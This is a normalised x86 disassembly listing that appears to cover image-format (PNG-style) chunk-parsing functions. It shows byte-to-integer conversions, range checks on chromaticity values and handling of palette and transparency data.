shl eax 0x8
add eax ecx
movzx ecx [ esp + 0x5b ]
movzx esi [ esp + 0x61 ]
shl ebp 0x8
add ebp edx
movzx edx [ esp + 0x5a ]
shl eax 0x8
add eax edx
movzx edx [ esp + 0x5d ]
shl eax 0x8
add eax ecx
movzx ecx [ esp + 0x5c ]
shl ecx 0x8
add ecx edx
movzx edx [ esp + 0x5e ]
shl ecx 0x8
add ecx edx
movzx edx [ esp + 0x5f ]
shl ecx 0x8
add ecx edx
movzx edx [ esp + 0x60 ]
shl edx 0x8
add edx esi
movzx esi [ esp + 0x62 ]
shl edx 0x8
add edx esi
movzx esi [ esp + 0x63 ]
shl edx 0x8
add edx esi
movzx esi [ esp + 0x65 ]
mov [ esp + 0x1c ] edx
movzx edx [ esp + 0x64 ]
shl edx 0x8
add edx esi
movzx esi [ esp + 0x66 ]
shl edx 0x8
add edx esi
movzx esi [ esp + 0x67 ]
shl edx 0x8
add edx esi
movzx esi [ esp + 0x69 ]
mov [ esp + 0x20 ] edx
movzx edx [ esp + 0x68 ]
shl edx 0x8
mov [ esp + 0x18 ] edi
mov [ esp + 0x14 ] ebx
mov [ esp + 0x10 ] ebp
mov [ esp + 0x34 ] eax
mov [ esp + 0x2c ] ecx
add edx esi
fild [ esp + 0x18 ]
movzx esi [ esp + 0x6a ]
fld [ r--data ]
shl edx 0x8
add edx esi
fdiv st1
movzx esi [ esp + 0x6b ]
shl edx 0x8
add edx esi
mov [ esp + 0x28 ] edx
mov esi [ esp + 0x3c ]
fxch st1
fstp [ esp + 0x18 ]
fild [ esp + 0x14 ]
fdiv st1
fstp [ esp + 0x14 ]
fild [ esp + 0x10 ]
fdiv st1
fstp [ esp + 0x10 ]
fild [ esp + 0x34 ]
fdiv st1
fstp [ esp + 0x48 ]
fild [ esp + 0x2c ]
fdiv st1
fstp [ esp + 0x30 ]
fild [ esp + 0x1c ]
fdiv st1
fstp [ esp + 0x38 ]
fild [ esp + 0x20 ]
fdiv st1
fstp [ esp + 0x24 ]
fidivr [ esp + 0x28 ]
fstp [ esp + 0x40 ]
test esi esi
je r-xdata
call sub_43b800
push ebx
mov ecx esi
call sub_4376e0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x5c ]
xor ecx esp
call sub_43f96b
add esp 0x60
retn
mov ecx r--data
jmp r-xdata
fld [ esp + 0x40 ]
sub esp 0x40
fstp [ esp + 0x38 ]
fld [ esp + 0x64 ]
fstp [ esp + 0x30 ]
fld [ esp + 0x78 ]
fstp [ esp + 0x28 ]
fld [ esp + 0x70 ]
fstp [ esp + 0x20 ]
fld [ esp + 0x88 ]
fstp [ esp + 0x18 ]
fld [ esp + 0x50 ]
fstp [ esp + 0x10 ]
fld [ esp + 0x54 ]
fstp [ esp + 0x8 ]
fld [ esp + 0x58 ]
fstp [ esp ]
call sub_43bc60
mov edx [ esp + 0x68 ]
mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x5c ]
push edx
mov edx [ esp + 0x70 ]
push eax
mov eax [ esp + 0x7c ]
push ecx
push edx
push eax
mov eax [ esp + 0x98 ]
push ebp
push ebx
push edi
call sub_43bd60
add esp 0x60
test [ esi + 0x8 ] 0x800
je r-xdata
add edi 0xffff89c2
cmp edi 0x7d0
ja r-xdata
mov esi [ esp + 0x44 ]
mov ecx r--data
call sub_43b800
fld [ esp + 0x48 ]
sub esp 0x20
fstp [ esp + 0x18 ]
fld [ esp + 0x30 ]
fstp [ esp + 0x10 ]
fld [ esp + 0x34 ]
fstp [ esp + 0x8 ]
fld [ esp + 0x38 ]
fstp [ esp ]
push r--data
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
fld [ esp + 0x68 ]
fstp [ esp + 0x20 ]
add esp 0x8
fld [ esp + 0x44 ]
fstp [ esp + 0x10 ]
fld [ esp + 0x58 ]
fstp [ esp + 0x8 ]
fld [ esp + 0x50 ]
fstp [ esp ]
push r--data
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
add esp 0x28
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x5c ]
xor ecx esp
call sub_43f96b
add esp 0x60
retn
add ebx 0xffff8364
cmp ebx 0x7d0
ja r-xdata
add ebp 0xffff09e8
cmp ebp 0x7d0
ja r-xdata
add eax 0xffff8300
cmp eax 0x7d0
ja r-xdata
add ecx 0xffff8eb8
cmp ecx 0x7d0
ja r-xdata
mov eax [ esp + 0x1c ]
add eax 0xffff1988
cmp eax 0x7d0
ja r-xdata
mov ecx [ esp + 0x20 ]
add ecx 0xffffc950
cmp ecx 0x7d0
ja r-xdata
cmp edx 0x1388
jl r-xdata
cmp edx 0x1b58
jle r-xdata
sub_4387e0
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov esi ecx
mov edi eax
mov eax [ esi + 0x68 ]
mov ebx 0x1
test bl al
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
jmp r-xdata
test al 0x2
je r-xdata
mov ecx r--data
test ebp ebp
je r-xdata
mov ecx r--data
call sub_43b800
cmp edi ebx
je r-xdata
test [ ebp + 0x8 ] 0x800
je r-xdata
lea edi [ esp + 0x17 ]
call sub_437670
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
jne r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
movzx edi [ esp + 0x17 ]
cmp edi 0x4
jl r-xdata
call sub_43b800
push edi
mov ecx esi
call sub_4376e0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
test ebp ebp
je r-xdata
mov ecx r--data
call sub_43b800
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push edi
push esi
mov eax ebp
call sub_43c440
add esp 0x8
test [ ebp + 0x8 ] bl
je r-xdata
test [ ebp + 0x8 ] 0x4
je r-xdata
mov eax [ ebp + 0xfc ]
cmp eax 0xafc8
jl r-xdata
mov eax [ ebp + 0x100 ]
cmp eax 0x763e
jl r-xdata
mov ecx r--data
call sub_43b800
mov eax [ esi + 0x234 ]
push eax
push r--data
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
add esp 0xc
cmp eax 0xb3b0
jle r-xdata
mov ecx r--data
call sub_43b800
cmp eax 0x7e0e
jg r-xdata
mov eax [ ebp + 0x104 ]
cmp eax 0x7c9c
jl r-xdata
cmp eax 0x846c
jg r-xdata
mov eax [ ebp + 0x108 ]
cmp eax 0xf618
jl r-xdata
cmp eax 0xfde8
jg r-xdata
mov eax [ ebp + 0x10c ]
cmp eax 0x7d00
jl r-xdata
cmp eax 0x84d0
jg r-xdata
mov eax [ ebp + 0x110 ]
cmp eax 0x7148
jl r-xdata
cmp eax 0x7918
jg r-xdata
mov eax [ ebp + 0x114 ]
cmp eax 0xe678
jl r-xdata
cmp eax 0xee48
jg r-xdata
mov eax [ ebp + 0x118 ]
cmp eax 0x36b0
jl r-xdata
cmp eax 0x3e80
jg r-xdata
mov eax [ ebp + 0x11c ]
cmp eax 0x1388
jl r-xdata
cmp eax 0x1b58
jle r-xdata
sub_4389b0
push ecx
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax [ esi + 0x68 ]
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
jmp r-xdata
test al 0x2
je r-xdata
mov ecx r--data
call sub_43b800
push ebx
mov ecx esi
call sub_4376e0
add esp 0x4
pop esi
pop ebx
pop ecx
retn
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx r--data
call sub_43b800
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
test [ eax + 0x8 ] 0x1000
je r-xdata
lea eax [ ebx + 0x1 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov ecx r--data
call sub_43b800
push ebx
mov ecx esi
call sub_4376e0
add esp 0x4
pop esi
pop ebx
pop ecx
retn
xor edi edi
mov ecx [ esi + 0x248 ]
push eax
test ecx ecx
je r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov eax [ esi + 0x288 ]
mov [ ebx + eax ] 0x0
mov eax [ esi + 0x288 ]
mov edi eax
cmp [ edi ] 0x0
je r-xdata
mov ecx [ esi + 0x288 ]
cmp ecx ebp
je r-xdata
call sub_441c3d
add esp 0x4
push esi
call ecx
add esp 0x8
jmp r-xdata
inc edi
lea ecx [ eax + ebx - 0x1 ]
cmp edi ecx
jb r-xdata
jmp r-xdata
mov [ esi + 0x288 ] ebp
pop ebp
pop edi
pop esi
pop ebx
pop ecx
retn
mov eax [ esi + 0x24c ]
push ecx
cmp eax ebp
je r-xdata
push ebp
mov [ esi + 0x288 ] edi
call sub_437670
xor ebp ebp
push ebp
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
je r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
mov al [ edi ]
inc edi
test al al
je r-xdata
cmp eax ebp
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
mov [ esi + 0x288 ] ebp
pop ebp
pop edi
pop esi
pop ebx
pop ecx
retn
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
jmp r-xdata
sub edi [ esi + 0x288 ]
movzx ebp al
push edi
push ebx
push ebp
lea ecx [ esp + 0x1c ]
mov edx esi
call sub_437920
mov eax [ esp + 0x1c ]
mov ecx eax
add esp 0xc
sub ecx edi
cmp edi eax
ja r-xdata
mov ecx r--data
call sub_43b800
xor al al
mov ecx r--data
mov [ esi + 0x288 ] ebp
call sub_43b800
pop ebp
pop edi
pop esi
pop ebx
pop ecx
retn
mov ecx [ esi + 0x24c ]
push eax
cmp ecx ebp
je r-xdata
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
cmp ecx 0x4
jb r-xdata
call sub_44120e
add esp 0x4
push esi
call ecx
add esp 0x8
mov ecx r--data
mov [ esi + 0x288 ] ebp
call sub_43b800
pop ebp
pop edi
pop esi
pop ebx
pop ecx
retn
mov ecx r--data
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov ebx [ esi + 0x288 ]
movzx eax [ ebx + edi ]
lea edx [ ebx + edi ]
movzx edi [ edx + 0x1 ]
shl eax 0x8
or eax edi
movzx edi [ edx + 0x2 ]
shl eax 0x8
or eax edi
movzx edi [ edx + 0x3 ]
shl eax 0x8
or eax edi
cmp eax ecx
jae r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
jbe r-xdata
mov ecx eax
mov edi [ esp + 0x18 ]
push ecx
push edx
push ebp
push ebx
mov eax esi
call sub_43c550
mov eax [ esi + 0x288 ]
add esp 0x10
test eax eax
je r-xdata
test ebx ebx
je r-xdata
pop ebp
pop edi
mov [ esi + 0x288 ] 0x0
pop esi
pop ebx
pop ecx
retn
mov ecx [ esi + 0x24c ]
push eax
test ecx ecx
je r-xdata
mov ecx r--data
jmp r-xdata
mov eax [ esi + 0x24c ]
push ebx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push esi
call ecx
add esp 0x8
pop ebp
pop edi
mov [ esi + 0x288 ] 0x0
pop esi
pop ebx
pop ecx
retn
mov [ esi + 0x288 ] 0x0
call sub_43b800
pop ebp
pop edi
pop esi
pop ebx
pop ecx
retn
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
mov ecx r--data
jmp r-xdata
sub_438c90
sub esp 0x10
push ebx
push ebp
push esi
mov esi ecx
mov ebx eax
mov eax [ esi + 0x68 ]
push edi
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
mov ecx r--data
call sub_43b800
push ebx
mov ecx esi
call sub_4376e0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
lea eax [ ebx + 0x1 ]
test eax eax
je r-xdata
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
xor edi edi
mov ecx [ esi + 0x248 ]
push eax
test ecx ecx
je r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov eax [ esi + 0x288 ]
mov [ ebx + eax ] 0x0
mov ecx [ esi + 0x288 ]
mov edi ecx
cmp [ edi ] 0x0
je r-xdata
mov ecx [ esi + 0x288 ]
cmp ecx ebp
je r-xdata
call sub_441c3d
add esp 0x4
push esi
call ecx
add esp 0x8
jmp r-xdata
inc edi
lea edx [ ecx + ebx - 0x2 ]
cmp edi edx
jbe r-xdata
jmp r-xdata
mov [ esi + 0x288 ] ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esi + 0x24c ]
push ecx
cmp eax ebp
je r-xdata
mov [ esi + 0x288 ] edi
call sub_437670
xor ebp ebp
push ebp
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
je r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
mov al [ edi ]
xor edx edx
inc edi
cmp al 0x8
setne dl
mov [ esp + 0x14 ] al
mov eax ecx
sub eax edi
add eax ebx
lea edx [ edx * 4 + 0x6 ]
mov ebp edx
cdq
idiv ebp
test edx edx
je r-xdata
cmp ecx ebp
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
mov [ esi + 0x288 ] ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
jmp r-xdata
mov ebp eax
mov [ esp + 0x1c ] ebp
cmp ebp 0x19999999
jbe r-xdata
test ecx ecx
je r-xdata
mov ecx r--data
mov [ esi + 0x288 ] ebp
call sub_43b800
mov eax [ esi + 0x24c ]
push ecx
cmp eax ebp
je r-xdata
lea ecx [ ebp + ebp * 4 ]
add ecx ecx
call sub_43b6d0
mov [ esp + 0x18 ] eax
test eax eax
jne r-xdata
mov ecx r--data
call sub_43b800
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ecx r--data
mov [ esi + 0x288 ] 0x0
call sub_43b800
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
test ebp ebp
jle r-xdata
mov ecx r--data
call sub_43b800
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
mov ecx r--data
mov [ esi + 0x288 ] 0x0
call sub_43b800
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esi + 0x288 ]
mov ebx [ esp + 0x24 ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] eax
push ecx
mov eax esi
call sub_43c900
mov eax [ esi + 0x288 ]
add esp 0x4
test eax eax
je r-xdata
add eax 0x4
nop
mov ecx [ esp + 0x18 ]
mov [ esi + 0x288 ] 0x0
test ecx ecx
je r-xdata
mov ecx [ esi + 0x24c ]
push eax
test ecx ecx
je r-xdata
mov edx 0x100
imul cx dx
movzx edx [ edi + 0x1 ]
add cx dx
mov [ eax - 0x4 ] cx
movzx ecx [ edi + 0x2 ]
add edi 0x2
mov edx 0x100
imul cx dx
movzx edx [ edi + 0x1 ]
add cx dx
mov [ eax - 0x2 ] cx
movzx ecx [ edi + 0x2 ]
add edi 0x2
mov edx 0x100
imul cx dx
movzx edx [ edi + 0x1 ]
add cx dx
mov [ eax ] cx
movzx ecx [ edi + 0x2 ]
add edi 0x2
mov edx 0x100
imul cx dx
movzx edx [ edi + 0x1 ]
add cx dx
mov [ eax + 0x2 ] cx
add edi 0x2
inc edi
mov [ eax - 0x4 ] cx
movzx edx [ edi ]
inc edi
mov [ eax - 0x2 ] dx
movzx ecx [ edi ]
inc edi
mov [ eax ] cx
movzx edx [ edi ]
mov [ eax + 0x2 ] dx
inc edi
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esi + 0x24c ]
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push esi
call ecx
add esp 0x8
jmp r-xdata
cmp [ esp + 0x14 ] 0x8
movzx ecx [ edi ]
jne r-xdata
movzx cx [ edi ]
mov edx 0x100
imul cx dx
movzx dx [ edi + 0x1 ]
add cx dx
mov [ eax + 0x4 ] cx
add edi 0x2
add eax 0xa
sub ebp 0x1
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
mov [ esp + 0x4 ] ecx
jmp sub_44120e
push ecx
push esi
call eax
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
sub_439000
sub esp 0x110
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10c ] eax
push ebx
push ebp
mov ebp [ esp + 0x11c ]
push esi
mov esi edx
mov eax [ esi + 0x68 ]
mov ebx ecx
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test ebp ebp
je r-xdata
mov ecx r--data
cmp al 0x2
jne r-xdata
cmp ebx 0x2
je r-xdata
mov al [ esi + 0x126 ]
push edi
test al al
jne r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
cmp al 0x3
jne r-xdata
cmp ebx 0x6
jne r-xdata
mov ebx 0x2
lea edi [ esp + 0x10 ]
call sub_437670
mov eax 0x1
mov [ esi + 0x11a ] ax
mov ax [ esp + 0x10 ]
movzx cx al
mov edx 0x100
imul cx dx
movzx ax ah
add cx ax
mov [ esi + 0x194 ] cx
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
test [ esi + 0x68 ] 0x2
jne r-xdata
lea edi [ esp + 0x14 ]
call sub_437670
movzx edx [ esp + 0x14 ]
mov eax 0x100
imul dx ax
mov ecx 0x1
mov [ esi + 0x11a ] cx
movzx ecx [ esp + 0x15 ]
add dx cx
movzx ecx [ esp + 0x17 ]
mov [ esi + 0x18e ] dx
movzx edx [ esp + 0x16 ]
imul dx ax
add dx cx
movzx ecx [ esp + 0x19 ]
mov [ esi + 0x190 ] dx
movzx edx [ esp + 0x18 ]
imul dx ax
add dx cx
mov [ esi + 0x192 ] dx
jmp r-xdata
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
je r-xdata
call sub_43b800
push ebx
call sub_43b800
push ebx
mov ecx esi
call sub_4376e0
add esp 0x4
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x10c ]
xor ecx esp
call sub_43f96b
add esp 0x110
retn
movzx edx [ esi + 0x118 ]
cmp ebx edx
ja r-xdata
mov ecx r--data
call sub_43b800
movzx edx [ esi + 0x11a ]
lea ecx [ esi + 0x18c ]
push ecx
push edx
lea eax [ esp + 0x24 ]
push eax
mov edi ebp
mov eax esi
call sub_43c7e0
add esp 0xc
jmp r-xdata
xor eax eax
mov [ esi + 0x11a ] ax
jmp r-xdata
cmp ebx 0x100
ja r-xdata
mov ecx [ esp + 0x11c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x110
retn
test ebx ebx
jne r-xdata
lea edi [ esp + 0x1c ]
call sub_437670
mov [ esi + 0x11a ] bx
mov ecx r--data
call sub_43b800
push ebx
jmp r-xdata
mov ecx esi
call sub_4376e0
add esp 0x4
sub_439210
sub esp 0xc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi edx
mov eax [ esi + 0x68 ]
push edi
mov edi ecx
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
cmp [ esi + 0x126 ] 0x3
jne r-xdata
mov ecx r--data
movzx ebx al
and ebx 0x2
or ebx 0x1
add ebx ebx
mov ebx 0x1
jmp r-xdata
test ebp ebp
je r-xdata
test al 0x2
jne r-xdata
lea edi [ esp + 0x10 ]
call sub_437670
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
jne r-xdata
mov ecx r--data
call sub_43b800
push edi
mov ecx esi
call sub_4376e0
add esp 0x4
pop ebx
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x8 ]
xor ecx esp
call sub_43f96b
add esp 0xc
retn
cmp edi ebx
je r-xdata
mov al [ esi + 0x126 ]
push ebx
cmp al 0x3
jne r-xdata
test [ ebp + 0x8 ] 0x20
je r-xdata
mov ecx r--data
jmp r-xdata
mov ecx [ esp + 0x18 ]
pop ebx
pop edi
pop esi
pop ebp
xor ecx esp
call sub_43f96b
add esp 0xc
retn
mov al [ esi + 0x126 ]
cmp al 0x3
jne r-xdata
mov ecx r--data
jmp r-xdata
call sub_43b800
push edi
mov ecx esi
call sub_4376e0
add esp 0x4
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x8 ]
xor ecx esp
call sub_43f96b
add esp 0xc
retn
mov ecx 0x100
test al 0x2
jne r-xdata
mov al [ esp + 0x10 ]
mov [ esi + 0x138 ] al
test ebp ebp
je r-xdata
movzx eax [ esp + 0x10 ]
movzx edx [ esp + 0x11 ]
imul ax cx
add ax dx
movzx edx [ esp + 0x13 ]
mov [ esi + 0x13a ] ax
movzx eax [ esp + 0x12 ]
imul ax cx
add ax dx
movzx edx [ esp + 0x15 ]
mov [ esi + 0x13c ] ax
movzx eax [ esp + 0x14 ]
imul ax cx
add ax dx
movzx ax [ esp + 0x10 ]
movzx dx [ esp + 0x11 ]
imul ax cx
add ax dx
mov [ esi + 0x140 ] ax
mov [ esi + 0x13c ] ax
mov [ esi + 0x13a ] ax
jmp r-xdata
movzx ecx [ ebp + 0x14 ]
test cx cx
je r-xdata
mov ecx [ esi + 0x138 ]
lea eax [ esi + 0x138 ]
mov [ ebp + 0x5a ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x5e ] edx
mov ax [ eax + 0x8 ]
or [ ebp + 0x8 ] 0x20
mov [ ebp + 0x62 ] ax
mov [ esi + 0x13e ] ax
test ebp ebp
je r-xdata
movzx dx al
cmp dx cx
jb r-xdata
mov ecx [ esi + 0x114 ]
movzx eax al
lea eax [ eax + eax * 2 ]
movzx edx [ eax + ecx ]
add eax ecx
mov [ esi + 0x13a ] dx
movzx cx [ eax + 0x1 ]
mov [ esi + 0x13c ] cx
movzx edx [ eax + 0x2 ]
mov [ esi + 0x13e ] dx
jmp r-xdata
mov ecx r--data
call sub_43b800
pop ebx
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x8 ]
xor ecx esp
call sub_43f96b
add esp 0xc
retn
sub_439430
sub esp 0x210
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20c ] eax
push ebx
push esi
mov esi edx
mov eax [ esi + 0x68 ]
push edi
mov edi [ esp + 0x220 ]
mov ebx ecx
mov [ esp + 0x14 ] edi
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test al 0x2
jne r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
cmp eax 0x100
ja r-xdata
test edi edi
je r-xdata
mov ecx r--data
jmp r-xdata
call sub_43b800
push ebx
mov ecx esi
call sub_4376e0
add esp 0x4
push ebp
xor ebp ebp
test eax eax
jbe r-xdata
movzx ecx [ esi + 0x118 ]
mov eax ebx
shr eax 0x1
mov [ esp + 0x10 ] eax
cmp eax ecx
jne r-xdata
test [ edi + 0x8 ] 0x40
je r-xdata
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
pop ebp
test eax eax
jne r-xdata
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx [ esp + 0x218 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x210
retn
lea ebx [ esp + 0x18 ]
mov eax esi
call sub_43bf30
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x20c ]
xor ecx esp
call sub_43f96b
add esp 0x210
retn
mov ebx 0x2
lea edi [ esp + 0x10 ]
call sub_437670
mov ax [ esp + 0x10 ]
movzx dx al
mov ecx 0x100
imul dx cx
movzx ax ah
add dx ax
mov [ esp + ebp * 2 + 0x1c ] dx
inc ebp
cmp ebp [ esp + 0x14 ]
jb r-xdata
mov edi [ esp + 0x18 ]
sub_439570
sub esp 0x10
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc ] eax
push ebp
mov ebp [ esp + 0x18 ]
push esi
mov esi edx
mov eax [ esi + 0x68 ]
push edi
mov edi ecx
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test ebp ebp
je r-xdata
mov ecx r--data
push ebx
mov ebx 0x9
lea edi [ esp + 0x10 ]
call sub_437670
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
pop ebx
test eax eax
jne r-xdata
mov ecx r--data
jmp r-xdata
cmp edi 0x9
je r-xdata
test [ ebp + 0x8 ] 0x80
je r-xdata
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
xor ecx esp
call sub_43f96b
add esp 0x10
retn
test ebp ebp
je r-xdata
call sub_43b800
push edi
mov ecx esi
call sub_4376e0
add esp 0x4
pop edi
pop esi
pop ebp
mov ecx [ esp + 0xc ]
xor ecx esp
call sub_43f96b
add esp 0x10
retn
mov ecx r--data
jmp r-xdata
movzx eax [ esp + 0xc ]
movzx ecx [ esp + 0xd ]
movzx edx [ esp + 0xe ]
shl eax 0x8
add eax ecx
movzx ecx [ esp + 0xf ]
shl eax 0x8
add eax edx
movzx edx [ esp + 0x10 ]
shl eax 0x8
add eax ecx
movzx ecx [ esp + 0x12 ]
shl edx 0x8
mov [ ebp + 0x70 ] eax
movzx eax [ esp + 0x11 ]
add edx eax
movzx eax [ esp + 0x13 ]
shl edx 0x8
add edx ecx
mov cl [ esp + 0x14 ]
shl edx 0x8
add edx eax
or [ ebp + 0x8 ] 0x80
mov [ ebp + 0x74 ] edx
mov [ ebp + 0x78 ] cl
sub_439680
sub esp 0x10
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc ] eax
push ebp
mov ebp [ esp + 0x18 ]
push esi
mov esi edx
mov eax [ esi + 0x68 ]
push edi
mov edi ecx
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test ebp ebp
je r-xdata
mov ecx r--data
push ebx
mov ebx 0x9
lea edi [ esp + 0x10 ]
call sub_437670
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
pop ebx
test eax eax
jne r-xdata
mov ecx r--data
jmp r-xdata
cmp edi 0x9
je r-xdata
test [ ebp + 0x8 ] 0x100
je r-xdata
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
xor ecx esp
call sub_43f96b
add esp 0x10
retn
test ebp ebp
je r-xdata
call sub_43b800
push edi
mov ecx esi
call sub_4376e0
add esp 0x4
pop edi
pop esi
pop ebp
mov ecx [ esp + 0xc ]
xor ecx esp
call sub_43f96b
add esp 0x10
retn
mov ecx r--data
jmp r-xdata
movzx eax [ esp + 0xc ]
movzx ecx [ esp + 0xd ]
movzx edx [ esp + 0xe ]
shl eax 0x8
add eax ecx
movzx ecx [ esp + 0xf ]
shl eax 0x8
add eax edx
movzx edx [ esp + 0x10 ]
shl eax 0x8
add eax ecx
movzx ecx [ esp + 0x12 ]
shl edx 0x8
mov [ ebp + 0x64 ] eax
movzx eax [ esp + 0x11 ]
add edx eax
movzx eax [ esp + 0x13 ]
shl edx 0x8
add edx ecx
mov cl [ esp + 0x14 ]
shl edx 0x8
add edx eax
or [ ebp + 0x8 ] 0x100
mov [ ebp + 0x68 ] edx
mov [ ebp + 0x6c ] cl
sub_439790
sub esp 0x14
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax [ esi + 0x68 ]
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov ecx r--data
jmp r-xdata
lea ecx [ ebx + 0x1 ]
call sub_43b6d0
mov [ esi + 0x288 ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
test [ eax + 0x8 ] 0x400
je r-xdata
call sub_43b800
push ebx
mov ecx esi
call sub_4376e0
add esp 0x4
pop esi
pop ebx
add esp 0x14
retn
push edi
mov edi eax
call sub_437670
xor edi edi
push edi
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
jne r-xdata
mov ecx r--data
call sub_43b800
pop esi
pop ebx
add esp 0x14
retn
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov ecx r--data
mov ecx [ esi + 0x288 ]
cmp ecx edi
je r-xdata
mov eax [ esi + 0x288 ]
mov [ ebx + eax ] 0x0
mov ecx [ esi + 0x288 ]
mov eax ecx
cmp [ eax ] 0x0
je r-xdata
mov [ esi + 0x288 ] edi
pop edi
pop esi
pop ebx
add esp 0x14
retn
mov eax [ esi + 0x24c ]
push ecx
cmp eax edi
je r-xdata
add ecx ebx
lea edx [ eax + 0xc ]
mov [ esp + 0x1c ] ecx
cmp ecx edx
ja r-xdata
lea esp [ esp ]
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
mov [ esi + 0x288 ] edi
pop edi
pop esi
